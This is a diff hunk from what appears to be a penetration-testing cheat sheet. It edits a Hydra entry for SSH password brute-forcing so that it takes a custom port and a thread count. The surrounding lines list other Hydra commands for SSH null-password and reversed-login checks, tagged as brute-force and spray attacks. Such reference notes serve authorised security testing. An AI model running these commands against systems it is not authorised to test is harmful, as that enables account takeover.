@@ -37,11 +37,11 @@ hydra -l <user|root> -e n <ip> ssh
 hydra -L <userlist> -e r <ip> ssh 
 ```
 
-## Hydra - ssh - file "login:pass" format - 22
-#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 
+## Hydra - ssh - file "login:pass" format - specify port
+#plateform/linux #target/remote #protocol/ssh #port/custom #cat/ATTACK/BRUTEFORCE-SPRAY 
 
 ```
-hydra -C <file_login_pass> <ip> ssh 
+hydra -t 4 -s <port> -C <file_login_pass> <ip> ssh 
 ```
 
 ## Hydra - ftp - 21 
